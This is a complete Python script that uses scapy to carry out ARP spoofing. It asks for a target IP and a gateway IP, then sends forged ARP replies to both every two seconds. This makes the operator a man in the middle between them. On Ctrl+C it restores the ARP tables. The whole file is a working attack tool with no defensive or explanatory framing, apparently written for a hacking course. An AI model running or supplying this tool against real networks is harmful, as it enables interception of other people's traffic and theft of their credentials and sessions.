#!/usr/bin/env python
import scapy.all as scapy
import time
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc
    
def spoof(target_ip,spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet, verbose=False)

sent_packets_count = 0

def restore(destination_ip,soure_ip):
	destination_mac =get_mac(destination_ip)
	soure_mac = get_mac(soure_ip)
	packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac,psrc=soure_ip,hwsrc=soure_mac)
	scapy.send(packet, count=4, verbose=False)

#target_ip = "192.168.113.72"
#gateway_ip = "192.168.113.163"
target_ip = input("enter target_ip: ")

gateway_ip = input("enter gateway_ip: ")

try:

	while True:
		
		spoof(target_ip, gateway_ip)
		spoof(gateway_ip,target_ip)
	#	print("[+]Sent two packets")
		sent_packets_count = sent_packets_count + 2
		print("\r[+]Packets sent:" + str(sent_packets_count), end="")
		time.sleep(2)
except KeyboardInterrupt:
	print("[+] Detected CRTL + C .....Restting ARP table .... Please wait.\n.")
	restore(target_ip, gateway_ip)
	restore(gateway_ip, target_ip)

